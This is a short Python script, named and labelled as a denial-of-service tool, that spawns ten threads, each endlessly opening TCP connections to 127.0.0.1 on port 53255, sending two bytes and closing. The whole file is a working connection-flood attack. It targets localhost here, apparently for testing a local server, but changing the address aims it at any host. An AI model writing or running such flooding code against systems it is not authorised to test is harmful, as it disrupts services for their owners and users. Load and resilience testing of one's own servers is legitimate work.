#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import threading

IP_ADDRESS = '127.0.0.1'
PORT = 53255
THREADS = 10


def DoS(address, port, index):
    print('Thread {} alive!'.format(index))
    while True:
        mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mySocket.connect((address, port))
        mySocket.send(int(1).to_bytes(2, byteorder='little'))
        mySocket.close()
        


if __name__ == '__main__':
    print('Start Dos server {}:{}'.format(IP_ADDRESS, PORT))
    threads = []
    for index in range(THREADS):
        threads.append(threading.Thread(target=DoS, args=(IP_ADDRESS,
                       PORT, index)))
        threads[index].start()

			